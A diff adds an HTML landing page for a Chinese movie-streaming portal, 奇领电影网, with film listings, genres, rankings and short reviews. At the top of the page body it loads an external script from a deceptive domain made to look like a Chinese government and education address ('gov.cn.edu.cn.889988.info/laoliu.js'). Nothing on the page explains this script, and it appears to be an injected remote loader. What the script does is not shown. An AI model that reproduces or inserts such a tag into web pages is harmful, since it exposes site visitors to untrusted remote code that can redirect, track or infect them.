@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>奇领电影网 - 高清电影在线观看</title>
+<meta name="description" content="奇领电影网提供高清电影、热播剧集、动漫综艺在线观看，移动端自适应，畅享优质观影体验。" />
+<meta name="keywords" content="奇领电影网,qilingdianyingwang-h5,高清电影,在线观影,影视推荐" />
+<meta name="author" content="奇领电影网" />
+<meta name="robots" content="index,follow" />
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
+  background: #0c1f1a;
+  color: #e6f2ec;
+  line-height: 1.7;
+}
+
+a { color: #19c37d; text-decoration: none; }
+a:hover { color: #e8c87a; }
+
+/* 导航 */
+.site-header {
+  background: linear-gradient(120deg, #0c1f1a, #103029);
+  border-bottom: 1px solid rgba(25,195,125,.25);
+  position: sticky;
+  top: 0;
+  z-index: 99;
+}
+.nav {
+  max-width: 1080px;
+  margin: 0 auto;
+  padding: 14px 18px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.brand {
+  font-size: 20px;
+  font-weight: 800;
+  color: #e8c87a;
+  letter-spacing: 1px;
+}
+.menu {
+  display: flex;
+  gap: 16px;
+  list-style: none;
+}
+.menu a {
+  font-size: 14px;
+  color: #cfe9df;
+}
+
+/* Hero */
+.hero {
+  padding: 64px 20px 48px;
+  text-align: center;
+  background:
+    radial-gradient(800px 300px at 50% -10%, rgba(25,195,125,.25), transparent),
+    #0c1f1a;
+}
+.hero h1 {
+  font-size: 38px;
+  color: #e8c87a;
+  margin-bottom: 12px;
+}
+.hero p {
+  color: #b9d8cd;
+  font-size: 15px;
+}
+.hero .url {
+  margin-top: 14px;
+  font-size: 14px;
+  color: #19c37d;
+}
+
+/* 区块 */
+.wrap {
+  max-width: 1080px;
+  margin: 0 auto;
+  padding: 40px 18px;
+}
+.block-title {
+  font-size: 24px;
+  margin-bottom: 18px;
+  padding-left: 12px;
+  border-left: 4px solid #19c37d;
+  color: #e8c87a;
+}
+
+/* 热映精选：横向 scroll-snap */
+.flex-scroll {
+  display: flex;
+  gap: 14px;
+  overflow-x: auto;
+  scroll-snap-type: x mandatory;
+  padding-bottom: 8px;
+}
+.film-chip {
+  flex: 0 0 160px;
+  scroll-snap-align: start;
+  background: #10271f;
+  border: 1px solid rgba(25,195,125,.2);
+  border-radius: 12px;
+  overflow: hidden;
+}
+.film-chip .poster {
+  height: 220px;
+  background: linear-gradient(160deg, #16463a, #0e2a22);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 30px;
+}
+.film-chip .meta {
+  padding: 10px;
+}
+.film-chip h3 {
+  font-size: 14px;
+  color: #e6f2ec;
+}
+.film-chip span {
+  font-size: 12px;
+  color: #8fc7b4;
+}
+
+/* 类型长廊：flex wrap 色块 */
+.genre-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+.genre {
+  flex: 1 1 calc(33.333% - 12px);
+  min-width: 120px;
+  padding: 18px;
+  border-radius: 12px;
+  background: linear-gradient(135deg, #123a30, #0c241d);
+  border: 1px solid rgba(232,200,122,.18);
+}
+.genre b {
+  color: #e8c87a;
+  font-size: 15px;
+}
+
+/* 榜单：有序列表重样式 */
+.rank-list {
+  list-style: none;
+  counter-reset: r;
+}
+.rank-list li {
+  counter-increment: r;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 14px;
+  margin-bottom: 10px;
+  background: #10271f;
+  border-radius: 10px;
+}
+.rank-list li::before {
+  content: counter(r);
+  width: 28px;
+  height: 28px;
+  border-radius: 50%;
+  background: #19c37d;
+  color: #04130d;
+  font-weight: 800;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* 影评札记：定义列表 */
+.note dl {
+  display: grid;
+  grid-template-columns: 120px 1fr;
+  gap: 10px 16px;
+}
+.note dt {
+  color: #e8c87a;
+  font-weight: 600;
+}
+.note dd {
+  color: #cfe9df;
+}
+
+/* 关于 */
+.about-card {
+  background: #10271f;
+  border: 1px solid rgba(25,195,125,.2);
+  border-radius: 14px;
+  padding: 22px;
+}
+
+footer {
+  text-align: center;
+  padding: 24px;
+  font-size: 13px;
+  color: #7fae9f;
+  border-top: 1px solid rgba(25,195,125,.15);
+  margin-top: 40px;
+}
+
+@media (max-width: 768px) {
+  .menu { display: none; }
+  .hero h1 { font-size: 30px; }
+  .genre { flex: 1 1 calc(50% - 12px); }
+  .note dl { grid-template-columns: 90px 1fr; }
+}
+@media (max-width: 480px) {
+  .film-chip { flex-basis: 140px; }
+  .genre { flex: 1 1 100%; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header">
+  <div class="nav">
+    <div class="brand">奇领电影网</div>
+    <ul class="menu">
+      <li><a href="#">首页</a></li>
+      <li><a href="#hot">热映精选</a></li>
+      <li><a href="#genre">类型长廊</a></li>
+      <li><a href="#rank">观影榜单</a></li>
+      <li><a href="#note">影评札记</a></li>
+      <li><a href="#about">关于奇领</a></li>
+    </ul>
+  </div>
+</header>
+
+<section class="hero">
+  <h1>奇领电影网</h1>
+  <p>高清电影 · 热播剧集 · 动漫综艺 · 移动端畅看</p>
+  <div class="url">https://qilingdianyingwang-h5.github.io</div>
+</section>
+
+<main class="wrap">
+
+  <section id="hot">
+    <h2 class="block-title">热映精选</h2>
+    <div class="flex-scroll">
+      <article class="film-chip">
+        <div class="poster">🎬</div>
+        <div class="meta"><h3>暗夜追凶</h3><span>悬疑 / 2026</span></div>
+      </article>
+      <article class="film-chip">
+        <div class="poster">🚀</div>
+        <div class="meta"><h3>星海归途</h3><span>科幻 / 2026</span></div>
+      </article>
+      <article class="film-chip">
+        <div class="poster">❤️</div>
+        <div class="meta"><h3>晚风情书</h3><span>爱情 / 2025</span></div>
+      </article>
+      <article class="film-chip">
+        <div class="poster">⚔️</div>
+        <div class="meta"><h3>江湖奇领</h3><span>武侠 / 2026</span></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="genre">
+    <h2 class="block-title">类型长廊</h2>
+    <div class="genre-row">
+      <div class="genre"><b>动作</b><p>硬核打斗、飙车枪战</p></div>
+      <div class="genre"><b>悬疑</b><p>烧脑反转、层层揭秘</p></div>
+      <div class="genre"><b>科幻</b><p>未来世界、星际冒险</p></div>
+      <div class="genre"><b>爱情</b><p>甜虐交织、治愈陪伴</p></div>
+      <div class="genre"><b>喜剧</b><p>解压爆笑、合家欢</p></div>
+      <div class="genre"><b>动画</b><p>国漫佳作、二次元</p></div>
+    </div>
+  </section>
+
+  <section id="rank">
+    <h2 class="block-title">观影榜单</h2>
+    <ol class="rank-list">
+      <li>星海归途 —— 9.4 分</li>
+      <li>暗夜追凶 —— 9.1 分</li>
+      <li>江湖奇领 —— 8.9 分</li>
+      <li>晚风情书 —— 8.7 分</li>
+      <li>都市迷踪 —— 8.5 分</li>
+    </ol>
+  </section>
+
+  <section id="note" class="note">
+    <h2 class="block-title">影评札记</h2>
+    <dl>
+      <dt>《星海归途》</dt>
+      <dd>用冷峻镜头讲人类孤独，结尾回扣“奇领”意象，余味很长。</dd>
+      <dt>《暗夜追凶》</dt>
+      <dd>节奏像刀，悬疑不靠吓人，而靠信息差与人物动机。</dd>
+      <dt>《江湖奇领》</dt>
+      <dd>武侠壳、人情核，动作戏文戏都不水。</dd>
+    </dl>
+  </section>
+
+  <section id="about">
+    <h2 class="block-title">关于奇领</h2>
+    <div class="about-card">
+      <p><strong>奇领电影网</strong> 是一个面向移动端的轻量影视导航站，专注高清电影与热播影视推荐。</p>
+      <p style="margin-top:10px;">官网：<a href="https://qilingdianyingwang-h5.github.io">https://qilingdianyingwang-h5.github.io</a></p>
+      <p style="margin-top:10px;">栏目：热映精选 / 类型长廊 / 观影榜单 / 影评札记 / 关于奇领</p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  © 2026 奇领电影网 · 网站名称：奇领电影网
+</footer>
+
+</body>
+</html>
